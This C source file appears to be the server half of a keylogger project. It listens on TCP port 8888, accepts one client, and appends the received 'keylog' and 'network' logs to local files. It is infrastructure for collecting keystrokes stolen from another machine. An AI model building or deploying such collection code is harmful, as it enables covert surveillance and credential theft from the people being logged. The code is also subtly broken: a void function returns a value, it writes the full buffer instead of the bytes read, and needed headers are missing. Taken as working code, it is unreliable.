#include <stdio.h>
#include <stdlib.h>

#include "server_client.h"

void run_server(void)
{
    // Variables
    int ssock, csock, addrlen, read_size, ret;
    struct sockaddr_in server, client;
    char rec_buffer[2000];
    
    short port = 8888;
    
    // Create a socket. Return value is a file descriptor for the socket.
    ssock = socket(AF_INET, SOCK_STREAM, 0);
    if (ssock == -1) {
        perror("Error creating socket\n");
        exit(0);
    }
    printf("Server socket created\n");
    
    // Set the server ip address, connection family and port. INADDR_ANY means
    // all the ip addresses of the server can be used to set up connection.
    server.sin_family      = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port        = htons(port);
    
    // Bind the socket for the connection
    if (bind(ssock, (struct sockaddr *) &server, sizeof(server)) < 0) {

        perror("Error binding\n");
        close(ssock);
        exit(0);
    }
    printf("Binding done\n");
    
    // Listen for incoming connections
    listen(ssock, SOMAXCONN);
    printf("Listening...\n");
    
    printf("Waiting for incoming connections...\n");
    addrlen = sizeof(struct sockaddr_in);
    
    // Accept connection from an incoming client
    csock = accept(ssock, (struct sockaddr *) &client, (socklen_t *) &addrlen);
    if (csock < 0) {
        perror("Error accepting connections\n");
        exit(0);
    }
    printf("Connection accepted\n");
    
    /*** Reading from Client and writing to local files* ***/
    
    memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
    /*Open keylog files for printing*/
    FILE *keylog_log = fopen("log/keylog_received.txt", "a");
    /*Receive a keylog file from the client*/
    if ((read_size = read(csock, rec_buffer, sizeof(rec_buffer))) > 0) {
        fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), keylog_log);
    } else {
        perror("Error receiving keylog log\n");
    }
    fclose(keylog_log);
    
    
    memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
    /*Open network log file for printing*/
    FILE *network_log = fopen("log/network_received.txt", "a");
    /*Receive network log file*/
    if ((read_size = read(csock, rec_buffer, sizeof(rec_buffer))) > 0) {
        fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), network_log);
    } else {
        perror("Error receiving network log\n");
    }
    fclose(network_log);
    
    memset(rec_buffer, 0, sizeof(rec_buffer));
    printf("\nLog transfer complete\n");
    
    close(csock);
    close(ssock);
    printf("End connection\n");
    
    return 0;
}